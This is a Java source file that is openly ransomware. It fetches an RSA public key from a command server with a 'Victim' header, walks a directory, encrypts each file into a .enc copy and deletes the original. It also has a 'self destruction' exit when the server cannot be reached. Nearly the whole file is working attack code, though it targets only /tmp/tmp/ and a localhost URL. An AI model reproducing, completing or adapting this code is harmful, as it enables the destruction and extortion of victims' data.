import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import javax.crypto.Cipher;

class secret {
	private String req_url="http://127.0.0.1/recv.php";
	void encryptFiles(int cipherMode,PublicKey pKey,String inputFile,String outputFile) throws Exception{
			Cipher cipher = Cipher.getInstance("RSA");
			cipher.init(Cipher.ENCRYPT_MODE,pKey);
			String textString = "";
			textString = new String(Files.readAllBytes(Paths.get(inputFile)));
			byte[] cipherText = cipher.doFinal(textString.getBytes());
			BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
			writer.write(Base64.getEncoder().encodeToString(cipherText));
			writer.close();
    }
    PublicKey initiaiteConnection() throws IOException{
        return sendPOST();
    }

    private PublicKey sendPOST() throws IOException{
        URL obj = new URL(req_url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.addRequestProperty("Victim", "Yes");
		int maxTries = 3;
		while(maxTries != 0){
			int code = con.getResponseCode();
			if(code == 200){
				break;
			}
			maxTries--;
		}
		if(maxTries == 0){
			//code for self destruction
			System.out.println("Not Reachable!");
			System.exit(0);
		}
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
		}
		in.close();
		String tmp = response.toString();
		String[] details = tmp.split("@",2);
		String identifer = details[0];
		String pubKey = details[1].replaceAll("-","").replaceAll("BEGIN PUBLIC KEY","").replaceAll("END PUBLIC KEY","");
		//System.out.println(pubKey);
		byte[] publickBytes = Base64.getDecoder().decode(pubKey);
		X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publickBytes);
		try{
			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
			PublicKey publicKey = keyFactory.generatePublic(keySpec);
			return publicKey;
		}
		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
			throw new RuntimeException(e);
		}
		//publickKey final in PublicKey publicKey 
    }
}

class RansomwareActivate{
	void encryptAllFiles(PublicKey pubKey) throws IOException{
		secret sec = new secret();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Encrypting file: "+file.toString());
				sec.encryptFiles(Cipher.ENCRYPT_MODE, pubKey, file.toString(),file.toString()+".enc");
				File f = new File(file.toString());
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
	}
}

class encrypt {
	static void activate(PublicKey pubKey) throws IOException{
		RansomwareActivate ransomware  = new RansomwareActivate();
		ransomware.encryptAllFiles(pubKey);
	}
	public static void main(String[] args) throws IOException{
		secret sec = new secret();
		PublicKey pubKey =  sec.initiaiteConnection();
		activate(pubKey);
	}
}